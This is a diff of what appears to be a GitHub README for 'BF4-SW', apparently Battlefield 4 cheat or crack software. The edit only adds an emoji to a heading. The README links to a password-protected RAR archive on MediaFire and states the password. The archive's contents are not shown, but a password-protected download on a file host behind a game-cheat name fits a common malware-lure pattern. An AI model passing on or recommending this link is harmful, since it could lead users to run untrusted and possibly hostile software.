@@ -2,7 +2,7 @@
 
 ![1](https://github.com/figerrsty/BF4-SW/assets/151858529/e67c18da-d9f9-4942-9554-d030e66df81f)
 
-## Soft link: [HERE](https://www.mediafire.com/file/a539gymv3gav0l2/BF4-SW.rar)
+## 📁Soft link: [HERE](https://www.mediafire.com/file/a539gymv3gav0l2/BF4-SW.rar)
 
 ### 🔓Pass: 1221
 
